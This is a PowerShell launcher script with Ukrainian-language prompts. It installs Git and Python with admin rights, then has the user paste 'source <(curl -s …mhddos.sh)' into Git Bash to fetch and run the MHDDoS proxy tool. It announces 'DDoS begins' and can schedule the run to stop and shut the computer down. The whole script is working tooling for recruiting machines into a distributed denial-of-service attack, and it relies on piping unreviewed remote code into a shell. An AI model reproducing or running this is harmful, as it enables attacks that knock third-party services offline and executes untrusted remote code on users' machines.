#   ------------------------- Settings ------------------------
if ([Console]::OutputEncoding.BodyName -ne "cp866") {[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("cp866")}
[double]$OS = ([string][System.Environment]::OSVersion.Version.Major) + "." + ([string][System.Environment]::OSVersion.Version.Minor)
if ($OS -lt 6.1) {$oldOS = (Get-WmiObject -class Win32_OperatingSystem).Caption ; Write-Output "Версія вашого Windows застаріла ($oldOS)" ; Start-Sleep -s 5 ; Exit}
if ($PSVersionTable.PSVersion.Major -lt 5) {$PSold = $true} else {$PSold = $false}
if ($PSold -eq $true) {
    if ((Get-WmiObject win32_operatingsystem | Select-Object osarchitecture).osarchitecture -like "*64*") {
        $OS64bit = $true
    } else {$OS64bit = $false}
} else {$OS64bit = [System.Environment]::Is64BitOperatingSystem}
# Write-Output "OS = $OS | PSold = $PSold | OS64bit = $OS64bit"
$root = "$env:userprofile\Desktop\mhddos-proxy-py"
$mhddos_bash_clipboard = "https://raw.githubusercontent.com/wazxn/mhddos-proxy-py/main/mhddos.sh"

#   ------------------------- function-block ------------------------
function CheckDownloadInstall {
    #   --------------------------------------------------------------------------------------------------------------|
    if ($OS64bit -eq $true) {
        $git_url = "https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe"
        $py_url = "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"
    } else {
        $git_url = "https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-32-bit.exe"
        $py_url = "https://www.python.org/ftp/python/3.10.4/python-3.10.4.exe"
    }
    $git_filename = $git_url.SubString($git_url.LastIndexOf('/') + 1)
    $git_mb = [math]::round((((Invoke-WebRequest "$git_url" -Method Head).Headers.'Content-Length') / 1MB),1)
    $py_filename = $py_url.SubString($py_url.LastIndexOf('/') + 1)
    $py_mb = [math]::round((((Invoke-WebRequest "$py_url" -Method Head).Headers.'Content-Length') / 1MB),1)
    $git_mb = [string]$git_mb + "MB" ; $py_mb = [string]$py_mb + "MB"
    #   --------------------------------------------------------------------------------------------------------------|
    if ( -not (Test-Path "$env:programfiles\*Git*\git-bash.exe")) {
        if ( -not (Test-Path "$root\$git_filename")) {
            #   --------------------------------------------------------------------------------------------------------------|
            Write-Output "Завантажити [$git_filename]? Розмір: $git_mb ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
            if ($key -eq "Y" -or $key -eq "Enter") {
                Clear-Host ; Write-Output "Завантаження $git_filename ` Розмір: $git_mb"
                if ($PSold -eq $true) {
                    (New-Object Net.WebClient).DownloadFile("$git_url", "$root\$git_filename")
                } else {Invoke-WebRequest "$git_url" -OutFile "$root\$git_filename"}
            } else {Clear-Host ; return}
            #   --------------------------------------------------------------------------------------------------------------|
        } else {
            #   --------------------------------------------------------------------------------------------------------------|
            Write-Output "Встановити [$git_filename]? Розмір: $git_mb ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
            if ($key -eq "Y" -or $key -eq "Enter") {
                Clear-Host ; Write-Output "Встановлення $git_filename ` Розмір: $git_mb"
                Start-Process "$root\$git_filename" -ArgumentList /silent , /norestart -Verb RunAs -Wait ; Write-Output "done." ; Start-Sleep -s 1
            }
            #   --------------------------------------------------------------------------------------------------------------|
        }
    }
    Clear-Host
    if ( -not (Test-Path "$env:localappdata\Programs\Python\*Python*\python.exe")) {
        if ( -not (Test-Path "$root\$py_filename")) {
            #   --------------------------------------------------------------------------------------------------------------|
            Write-Output "Завантажити [$py_filename]? Розмір: $py_mb ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
            if ($key -eq "Y" -or $key -eq "Enter") {
                Clear-Host ; Write-Output "Завантаження $py_filename" "Розмір: $py_mb"
                if ($PSold -eq $true) {
                    (New-Object Net.WebClient).DownloadFile("$py_url", "$root\$py_filename")
                } else {Invoke-WebRequest "$py_url" -OutFile "$root\$py_filename"}
            } else {Clear-Host ; return}
            #   --------------------------------------------------------------------------------------------------------------|
        } else {
            #   --------------------------------------------------------------------------------------------------------------|
            Write-Output "Встановити [$py_filename]? Розмір: $py_mb ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
            if ($key -eq "Y" -or $key -eq "Enter") {
                Clear-Host ; Write-Output "Встановлення $py_filename" "Розмір: $py_mb"
                Start-Process "$root\$py_filename" -ArgumentList /passive , PrependPath=1 -Verb RunAs -Wait ; Write-Output "done." ; Start-Sleep -s 1
            }
            #   --------------------------------------------------------------------------------------------------------------|
        }
    }
    Clear-Host
}
#   --------------------------------------------------------------------------------------------------------------|
if ( -not (Test-Path "$root")) {New-Item -Path "$root" -ItemType Directory | out-null}
CheckDownloadInstall
if ( -not (Test-Path "$env:programfiles\*Git*\git-bash.exe") -or -not (Test-Path "$env:localappdata\Programs\Python\*Python*\python.exe")) {
    Clear-Host ; Write-Output "Git або Python не встановлений" ; Start-Sleep -s 2 ; Clear-Host ; Write-Output "Вихід" ; Start-Sleep -s 2 ; exit
}
#   --------------------------------------------------------------------------------------------------------------|
Write-Output "Запланувати завершення роботи програми? ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
if ($key -eq "Y" -or $key -eq "Enter") {
    [int]$h = Read-Host "Вкажіть кількість годин" ; [int]$m = Read-Host "Вкажіть кількість хвилин"
    $h = $h*3600 ; $m = $m*60 ; $time = $h + $m
    Write-Output "По завершенню роботи виключити комп*ютер ` [Enter], [Y] - Так" ; $keys = [Console]::ReadKey($true).Key
    if ($keys -eq "Y" -or $keys -eq "Enter") {$Shutdown = $true} else {$Shutdown = $false}
}
Clear-Host ; Write-Output "В новому вікні вставте й запустіть команду [ПКМ] і [Enter]" ; Start-Sleep -s 5 ; Clear-Host
Write-Output "--------------- Дудос Починається ---------------"
Set-Clipboard -Value "source <(curl -s $mhddos_bash_clipboard)"
Start-Process -filepath "$env:programfiles\Git\git-bash.exe"
if ($key -eq "Y" -or $key -eq "Enter") {
    $now = (get-date) ; $future = (get-date).AddSeconds($time)
    Write-Output "Час початку: $now" ` "Час закінчення: $future" ; Start-Sleep -s $time
    get-process | where-object {$_.MainWindowTitle -like "*c/Users*"} | stop-process
    if ($Shutdown -eq $true) {Stop-Computer -ComputerName localhost}
}
Clear-Host
exit